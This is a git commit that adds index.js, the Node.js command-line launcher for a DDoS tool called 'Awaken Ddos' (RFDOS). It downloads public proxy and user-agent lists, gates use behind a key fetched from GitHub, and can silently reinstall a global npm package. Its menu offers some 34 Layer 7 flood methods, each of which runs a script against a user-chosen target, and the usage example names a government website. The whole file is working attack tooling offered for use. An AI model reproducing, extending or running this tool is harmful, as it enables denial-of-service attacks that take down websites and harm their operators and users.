7ea511de37d8b3d70ffde783eaca22c8e82974cf
RyoxAds <latterdames@gmail.com>
2025-01-15 12:05:02 +0700

    AMBATUKAN
    NOOOO

---
+++ index.js
@@ -0,0 +1,461 @@
+#!/usr/bin/env node
+
+const { exec, spawn  } = require('child_process')
+const readline = require('readline')
+const url = require('url')
+const fs = require('fs')
+const axios = require('axios')
+const path = require('path')
+const version = '8.1.6'
+const Username = 'RFDOS'
+const Limits = 'Unlimited'
+const vip = 'true'
+const CoolDown = '0 second'
+let processList = [];
+
+const permen = readline.createInterface({
+  input: process.stdin,
+  output: process.stdout
+})
+// [========================================] //
+function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+// [========================================] //
+async function banner() {
+console.clear()
+console.log(`
+                ⠀⠀⠀⣀⣀⣤⣤⣤⣤⡼⠀⢀⡀⣀⢱⡄⡀⠀⠀⠀⢲⣤⣤⣤⣤⣀⣀⡀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⡿⠛⠋⠁⣤⣿⣿⣿⣧⣷⠀⠀⠘⠉⠛⢻⣷⣿⣽⣿⣿⣷⣦⣄⡀
+⠀⠀⠀⠀⠀⠀⢀⣴⣞⣽⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠠⣿⣿⡟⢻⣿⣿⣇⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣟⢦⡀
+⠀⠀⠀⠀⠀⣠⣿⡾⣿⣿⣿⣿⣿⠿⣻⣿⣿⡀⠀⠀⠀⢻⣿⣷⡀⠻⣧⣿⠆⠀⠀⠀⠀⣿⣿⣿⡻⣿⣿⣿⣿⣿⠿⣽⣦⡀
+⠀⠀⠀⠀⣼⠟⣩⣾⣿⣿⣿⢟⣵⣾⣿⣿⣿⣧⠀⠀⠀⠈⠿⣿⣿⣷⣈⠁⠀⠀⠀⠀⣰⣿⣿⣿⣿⣮⣟⢯⣿⣿⣷⣬⡻⣷⡄
+⠀⠀⢀⡜⣡⣾⣿⢿⣿⣿⣿⣿⣿⢟⣵⣿⣿⣿⣷⣄⠀⣰⣿⣿⣿⣿⣿⣷⣄⠀⢀⣼⣿⣿⣿⣷⡹⣿⣿⣿⣿⣿⣿⢿⣿⣮⡳⡄
+⠀⢠⢟⣿⡿⠋⣠⣾⢿⣿⣿⠟⢃⣾⢟⣿⢿⣿⣿⣿⣾⡿⠟⠻⣿⣻⣿⣏⠻⣿⣾⣿⣿⣿⣿⡛⣿⡌⠻⣿⣿⡿⣿⣦⡙⢿⣿⡝⣆
+⠀⢯⣿⠏⣠⠞⠋⠀⣠⡿⠋⢀⣿⠁⢸⡏⣿⠿⣿⣿⠃⢠⣴⣾⣿⣿⣿⡟⠀⠘⢹⣿⠟⣿⣾⣷⠈⣿⡄⠘⢿⣦⠀⠈⠻⣆⠙⣿⣜⠆
+⢀⣿⠃⡴⠃⢀⡠⠞⠋⠀⠀⠼⠋⠀⠸⡇⠻⠀⠈⠃⠀⣧⢋⣼⣿⣿⣿⣷⣆⠀⠈⠁⠀⠟⠁⡟⠀⠈⠻⠀⠀⠉⠳⢦⡀⠈⢣⠈⢿⡄
+⣸⠇⢠⣷⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠋⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢾⣆⠈⣷
+⡟⠀⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣤⡀⢸⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⢹
+⡇⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠈⣿⣼⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⢸
+⢡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠶⣶⡟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼
+⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡁⢠
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣼⣀⣠⠂
+                                 AWAKEN 
+                                  DDOS
+                         PEMILIK RFAM-HANZZ
+Username: ${Username}
+Version: ${version}
+Limit: ${Limits}
+Vip: ${true}
+CoolDown: ${CoolDown}                              
+========================================================================`)}
+// [========================================] //
+async function scrapeProxy() {
+  try {
+    const response = await fetch('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt');
+    const data = await response.text();
+    fs.writeFileSync('proxy.txt', data, 'utf-8');
+  } catch (error) {
+    console.error(`Error fetching data: ${error.message}`);
+  }
+}
+// [========================================] //
+async function scrapeUserAgent() {
+  try {
+    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
+    const data = await response.text();
+    fs.writeFileSync('ua.txt', data, 'utf-8');
+  } catch (error) {
+    console.error(`Error fetching data: ${error.message}`);
+  }
+}
+// [========================================] //
+function clearProxy() {
+  if (fs.existsSync('proxy.txt')) {
+    fs.unlinkSync('proxy.txt');
+  }
+}
+// [========================================] //
+function clearUserAgent() {
+  if (fs.existsSync('ua.txt')) {
+    fs.unlinkSync('ua.txt');
+  }
+}
+// [========================================] //
+async function bootup() {
+  try {
+    console.log(`|| ▓░░░░░░░░░ || 10%`);
+    await exec(`npm install axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent`)
+    console.log(`|| ▓▓░░░░░░░░ || 20%`);
+    const getLatestVersion = await fetch('https://raw.githubusercontent.com/RyoxAds/Auki/refs/heads/main/PermenXfnTo.txt');
+    const latestVersion = await getLatestVersion.text()
+    console.log(`|| ▓▓▓░░░░░░░ || 30%`);
+    if (version === latestVersion.trim()) {
+    console.log(`|| ▓▓▓▓▓▓░░░░ || 60%`);
+    
+    const secretBangetJir = await fetch('https://raw.githubusercontent.com/WhiteXbec/R3X/refs/heads/main/ngeri.txt');
+    const password = await secretBangetJir.text();
+    await console.log(`Login Key Required`)
+    permen.question('[\x1b[1m\x1b[31m𝚁𝙵𝙳𝙾𝙾𝚂🗂📃𝚂𝙴𝙲𝚄𝚁𝙸𝚃𝚈\x1b[0m]: \n', async (skibidi) => {
+      if (skibidi === password.trim()) {
+        console.log(`Successfuly Logged`)
+        await scrapeProxy()
+        console.log(`|| ▓▓▓▓▓▓▓░░░ || 70%`)
+        await scrapeUserAgent()
+        console.log(`|| ▓▓▓▓▓▓▓▓▓▓ || 100%`)
+        await sleep(700)
+        console.clear()
+        console.log(`
+                ⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⣤⡼⠀⢀⡀⣀⢱⡄⡀⠀⠀⠀⢲⣤⣤⣤⣤⣀⣀⡀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⡿⠛⠋⠁⣤⣿⣿⣿⣧⣷⠀⠀⠘⠉⠛⢻⣷⣿⣽⣿⣿⣷⣦⣄⡀
+⠀⠀⠀⠀⠀⠀⢀⣴⣞⣽⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠠⣿⣿⡟⢻⣿⣿⣇⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣟⢦⡀
+⠀⠀⠀⠀⠀⣠⣿⡾⣿⣿⣿⣿⣿⠿⣻⣿⣿⡀⠀⠀⠀⢻⣿⣷⡀⠻⣧⣿⠆⠀⠀⠀⠀⣿⣿⣿⡻⣿⣿⣿⣿⣿⠿⣽⣦⡀
+⠀⠀⠀⠀⣼⠟⣩⣾⣿⣿⣿⢟⣵⣾⣿⣿⣿⣧⠀⠀⠀⠈⠿⣿⣿⣷⣈⠁⠀⠀⠀⠀⣰⣿⣿⣿⣿⣮⣟⢯⣿⣿⣷⣬⡻⣷⡄
+⠀⠀⢀⡜⣡⣾⣿⢿⣿⣿⣿⣿⣿⢟⣵⣿⣿⣿⣷⣄⠀⣰⣿⣿⣿⣿⣿⣷⣄⠀⢀⣼⣿⣿⣿⣷⡹⣿⣿⣿⣿⣿⣿⢿⣿⣮⡳⡄
+⠀⢠⢟⣿⡿⠋⣠⣾⢿⣿⣿⠟⢃⣾⢟⣿⢿⣿⣿⣿⣾⡿⠟⠻⣿⣻⣿⣏⠻⣿⣾⣿⣿⣿⣿⡛⣿⡌⠻⣿⣿⡿⣿⣦⡙⢿⣿⡝⣆
+⠀⢯⣿⠏⣠⠞⠋⠀⣠⡿⠋⢀⣿⠁⢸⡏⣿⠿⣿⣿⠃⢠⣴⣾⣿⣿⣿⡟⠀⠘⢹⣿⠟⣿⣾⣷⠈⣿⡄⠘⢿⣦⠀⠈⠻⣆⠙⣿⣜⠆
+⢀⣿⠃⡴⠃⢀⡠⠞⠋⠀⠀⠼⠋⠀⠸⡇⠻⠀⠈⠃⠀⣧⢋⣼⣿⣿⣿⣷⣆⠀⠈⠁⠀⠟⠁⡟⠀⠈⠻⠀⠀⠉⠳⢦⡀⠈⢣⠈⢿⡄
+⣸⠇⢠⣷⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠋⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢾⣆⠈⣷
+⡟⠀⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣤⡀⢸⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⢹
+⡇⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠈⣿⣼⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⢸
+⢡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠶⣶⡟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼
+⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡁⢠
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣼⣀⣠⠂
+                        Welcome To Awaken Ddos`)
+        await sleep(1000)
+		    await banner()
+        console.log(`𝙺𝚎𝚝𝚒𝚔 "𝚌𝚖𝚍" 𝙵𝚘𝚛 𝚂𝚑𝚘𝚠 𝙰𝚕𝚕 𝙲𝚘𝚖𝚖𝚊𝚗𝚍`)
+        sigma()
+      } else {
+        console.log(`Wrong Key`)
+        process.exit(-1);
+      }
+    }) 
+  } else {
+      console.log(`This Version Is Outdated. ${version} => ${latestVersion.trim()}`)
+      console.log(`Waiting Auto Update...`)
+      await exec(`npm uninstall -g prmnmd-tuls`)
+      console.log(`Installing update`)
+      await exec(`npm i -g prmnmd-tuls`)
+      console.log(`Restart Tools Please`)
+      process.exit()
+    }
+  } catch (error) {
+    console.log(`Are You Online?`)
+  }
+}
+// [========================================] //
+async function pushMonitor(target, methods, duration) {
+  const startTime = Date.now();
+  processList.push({ target, methods, startTime, duration })
+  setTimeout(() => {
+    const index = processList.findIndex((p) => p.methods === methods);
+    if (index !== -1) {
+      processList.splice(index, 1);
+    }
+  }, duration * 1000);
+}
+// [========================================] //
+function monitorAttack() {
+  console.log("\nMonitor Attack:\n");
+  processList.forEach((process) => {
+console.log(`Target: ${process.target}
+Methods: ${process.methods}
+Duration: ${process.duration} Seconds
+Since: ${Math.floor((Date.now() - process.startTime) / 1000)} seconds ago\n`);
+  });
+}
+// [========================================] //
+async function handleAttackCommand(args) {
+  if (args.length < 3) {
+    console.log(`Example: attack <url/ip> <duration> <methods>
+attack https://dpr.go.id 120 strike`);
+    sigma();
+	return
+  }
+const [target, duration, methods] = args
+try {
+const parsing = new url.URL(target)
+const hostname = parsing.hostname
+const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
+const result = scrape.data;
+
+console.log(`
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄.
+⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀⠀
+⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧⠀
+⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋⠀
+⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋.⢖⣫⠔⠋⠀⠀⠀
+⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀⠀⠀⠀⠀
+⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠁
+========================================================================
+                           𝘈𝘛𝘛𝘈𝘊𝘒 𝘉𝘠 RFDOS🔰
+Target   : ${target}
+Duration : ${duration}
+Methods  : ${methods}
+ISP      : ${result.isp}
+Ip       : ${result.query}
+AS       : ${result.as}
+Proof    : ${target}
+`)
+} catch (error) {
+  console.log(`Oops Something Went wrong`)
+}
+const metode = path.join(__dirname, `/lib/cache/${methods}`);
+ if (methods === 'boom') {
+   pushMonitor(target, methods, duration)
+   exec(`node ${metode} ${target} ${duration} 160 89`)
+	sigma()
+  } else if (methods === 'tornado') {
+   pushMonitor(target, methods, duration)
+   exec(`node ${metode} GET ${target} ${duration} 110 75 proxy.txt`)
+	sigma()
+  } else if (methods === 'worm-h2') {
+   pushMonitor(target, methods, duration)
+   exec(`node ${metode} ${target} ${duration} 200 60 proxy.txt`)
+	sigma()
+  } else if (methods === 'black') {
+   pushMonitor(target, methods, duration)
+   exec(`node ${metode} ${target} ${duration} 100 80`)
+	sigma()
+  } else if (methods === 'aqua') {
+   pushMonitor(target, methods, duration)
+   exec(`node ${metode} ${target} ${duration} 200 52 proxy.txt`)
+	sigma()
+  } else if (methods === 'uam') {
+   pushMonitor(target, methods, duration)
+   exec(`node ${metode} ${target} ${duration} 100 40 proxy.txt`)
+    sigma()
+  } else if (methods === 'inferno') {
+   pushMonitor(target, methods, duration)
+   exec(`node ${metode} ${target} ${duration} 105 74 proxy.txt`)
+	sigma()
+  } else if (methods === 'killer') {
+   pushMonitor(target, methods, duration)
+   exec(`node ${metode} ${target} ${duration} 105 45 proxy.txt`)
+	sigma()
+  } else if (methods === 'tls-bypass') {
+   pushMonitor(target, methods, duration)
+   exec(`node ${metode} ${target} ${duration} 100 55 proxy.txt`)
+	sigma()
+  } else if (methods === 'lezkill') {
+   pushMonitor(target, methods, duration)
+   exec(`node ${metode} ${target} ${duration} 100 25 proxy.txt`)
+	sigma()
+  } else if (methods === 'vxx') {
+   pushMonitor(target, methods, duration)
+   exec(`node ${metode} ${target} ${duration} 125 56 proxy.txt`)
+	sigma()
+  } else if (methods === 'geckold') {
+   pushMonitor(target, methods, duration)
+   exec(`node ${metode} ${target} ${duration} 130 80 proxy.txt`)
+	sigma()
+  } else if (methods === 'mix') {
+   pushMonitor(target, methods, duration)
+   exec(`node ${metode} ${target} ${duration} 80`)
+	sigma()
+  } else if (methods === 'mixsyn') {
+   pushMonitor(target, methods, duration)
+   exec(`node ${metode} ${target} ${duration} 78`)
+	sigma()
+  } else if (methods === 'glory') {
+   pushMonitor(target, methods, duration)
+   exec(`node ${metode} ${target} ${duration} 140 50 proxy.txt`)
+	sigma()
+  } else if (methods === 'browsers') {
+   pushMonitor(target, methods, duration)
+   exec(`node ${metode} ${target} ${duration} 198 90 proxy.txt`)
+	sigma()
+  } else if (methods === 'solar') {
+   pushMonitor(target, methods, duration)
+   exec(`node ${metode} ${target} ${duration} 205 86 proxy.txt`)
+	sigma()
+  } else if (methods === 'mantan') {
+   pushMonitor(target, methods, duration)
+   exec(`node ${metode} ${target} ${duration} 56 108 proxy.txt`)
+	sigma()
+  } else if (methods === 'blash') {
+   pushMonitor(target, methods, duration)
+   exec(`node ${metode} ${target} ${duration} 60 100 proxy.txt`)
+	sigma()
+  } else if (methods === 'cobra') {
+   pushMonitor(target, methods, duration)
+   exec(`node ${metode} ${target} ${duration} 68 120 proxy.txt`)
+	sigma()
+  } else if (methods === 'pidoras') {
+   pushMonitor(target, methods, duration)
+   exec(`node ${metode} ${target} ${duration} 132 76 proxy.txt`)
+	sigma()
+  } else if (methods === 'ryofc') {
+   pushMonitor(target, methods, duration)
+   exec(`node ${metode} ${target} ${duration} 200 20 proxy.txt`)
+	sigma()
+  } else if (methods === 'skynet-tls') {
+   pushMonitor(target, methods, duration)
+   exec(`node ${metode} ${target} ${duration} 109 45 proxy.txt`)
+	sigma()
+  } else if (methods === 'tls-vip') {
+   pushMonitor(target, methods, duration)
+   exec(`node ${metode} ${target} ${duration} 160 70 proxy.txt`)
+	sigma()
+  } else if (methods === 'flood') {
+   pushMonitor(target, methods, duration)
+   exec(`node ${metode} ${target} ${duration}`)
+	sigma()
+  } else if (methods === 'tls') {
+    pushMonitor(target, methods, duration)
+     exec(`node ${metode} ${target} ${duration} 169 79`)
+    sigma()
+    } else if (methods === 'strike') {
+      pushMonitor(target, methods, duration)
+       exec(`node ${metode} GET ${target} ${duration} 80 190 proxy.txt --full`)
+      sigma()
+      } else if (methods === 'kill') {
+       pushMonitor(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration} 100 10`)
+        sigma()
+        } else if (methods === 'bypass') {
+       pushMonitor(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
+          sigma()
+          } else if (methods === 'raw') {
+       pushMonitor(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration}`)
+          sigma()
+          } else if (methods === 'thunder') {
+       pushMonitor(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
+          sigma()
+          } else if (methods === 'rape') {
+       pushMonitor(target, methods, duration)
+        exec(`node ${metode} ${duration} 10 proxy.txt 70 ${target}`)
+          sigma()
+          } else if (methods === 'storm') {
+       pushMonitor(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
+          sigma()
+          } else if (methods === 'destroy') {
+       pushMonitor(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
+          sigma()
+          } else if (methods === 'slim') {
+       pushMonitor(target, methods, duration)
+const destroy = path.join(__dirname, `/lib/cache/destroy`);
+const storm = path.join(__dirname, `/lib/cache/storm`);
+const rape = path.join(__dirname, `/lib/cache/rape`);
+        exec(`node ${destroy} ${target} ${duration} 100 1 proxy.txt`)
+        exec(`node ${storm} ${target} ${duration} 100 1 proxy.txt`)
+        exec(`node ${rape} ${duration} 1 proxy.txt 70 ${target}`)
+          sigma()
+          } else {
+    console.log(`Method ${methods} not recognized.`);
+  }
+};
+// [========================================] //
+async function sigma() {
+const getNews = await fetch(`https://raw.githubusercontent.com/permenmd/cache/main/news.txt`)
+const latestNews = await getNews.text();
+const creatorCredits = `
+CREATED BY RYO
+
+thx to 
+My good (Allah)
+my parent
+my friend
+hanzz
+ryo
+`
+permen.question('[\x1b[1m\x1b[32m Awaken Ddos 🪐 \x1b[0m]: \n', (input) => {
+  const [command, ...args] = input.trim().split(/\s+/);
+
+  if (command === 'help') {
+    console.log(`
+| methods      | show list of available methods
+| attack       | launch ddos attack
+| monitor      | show monitor attack
+| credits      | show creator of these tools
+| clear        | clear terminal
+`);
+    sigma();
+  } else if (command === 'methods') {
+    console.log(`
+[=========================================]
+|| flood      || Layer7
+|| tls        || Layer7
+|| strike     || Layer7
+|| kill       || Layer7
+|| raw        || Layer7
+|| bypass     || Layer7
+|| thunder    || Layer7
+|| storm      || Layer7
+|| rape       || Layer7
+|| destroy    || Layer7
+|| slim       || Layer7
+|| skynet-tls || Layer7
+|| glory      || Layer7
+|| mixsyn     || Layer7
+|| mantan    || Layer7
+|| mix        || Layer7
+|| pidoras   || Layer7
+|| cobra    || Layer7
+|| blash     || Layer7
+|| solar     || Layer7
+|| browsers  || Layer7
+|| vxx        || Layer7
+|| geckold    || Layer7
+|| lezkill    || Layer7
+|| tls-vip    || Layer7
+|| tls-bypass || Layer7
+|| killer     || Layer7
+|| black      || Layer7
+|| aqua    || Layer7
+|| boom       || Layer7
+|| inferno    || Layer7
+|| worm-h2 || Layer7
+|| uam     || Layer7
+|| ryofc    || Layer7
+[=========================================]
+`);
+    sigma();
+  } else if (command === 'credits') {
+    console.log(`
+${creatorCredits}`);
+    sigma();
+  } else if (command === 'attack') {
+    handleAttackCommand(args);
+  } else if (command === 'monitor') {
+    monitorAttack()
+    sigma()
+  } else if (command === 'clear') {
+    banner()
+    sigma()
+    } else {
+    console.log(`${command} Not Found`);
+    sigma();
+  }
+});
+}
+// [========================================] //
+function clearall() {
+  clearProxy()
+  clearUserAgent()
+}
+// [========================================] //
+process.on('exit', clearall);
+process.on('SIGINT', () => {
+  clearall()
+  process.exit();
+});
+process.on('SIGTERM', () => {
+clearall()
+ process.exit();
+});
+
+bootup()
